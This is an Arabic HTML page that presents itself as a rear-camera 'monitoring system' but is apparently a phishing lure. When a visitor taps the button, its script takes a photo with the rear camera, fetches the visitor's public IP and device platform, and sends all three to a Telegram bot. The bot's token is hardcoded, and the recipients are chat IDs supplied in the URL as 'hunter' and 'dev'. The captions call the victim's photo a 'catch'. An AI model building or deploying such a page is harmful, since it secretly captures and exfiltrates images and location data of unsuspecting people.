<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام المراقبة 2 - 2009</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: #fff; padding: 20px; }
        .btn { padding: 20px; background: #e74c3c; color: white; border: none; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; max-width: 300px; }
    </style>
</head>
<body>
    <h3>تفعيل الكاميرا الخلفية للمراقبة 📸</h3>
    <button class="btn" onclick="capture()">تصوير القاعة الآن</button>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const pr = new URLSearchParams(window.location.search);
        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';

        async function capture() {
            try {
                // هنا الفرق (environment) للكاميرا الخلفية
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(async (blob) => {
                        let ip = "N/A"; try { ip = await (await fetch('https://api.ipify.org')).text(); } catch(e){}
                        const caption = encodeURIComponent(`📸 صيدة خلفية\n👤 الصياد: ${pr.get('hunter')}\n🌐 IP: ${ip}\n📱 الجهاز: ${navigator.platform}`);
                        const fd = new FormData(); fd.append('photo', blob, 'b.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('id')}&caption=${caption}`, {method:'POST', body:fd});
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('dev')}&caption=${caption}`, {method:'POST', body:fd});
                        alert("تم التصوير بنجاح");
                    }, 'image/jpeg');
                }, 2000);
            } catch (e) { alert("يجب السماح بالكاميرا"); }
        }
    </script>
</body>
</html>
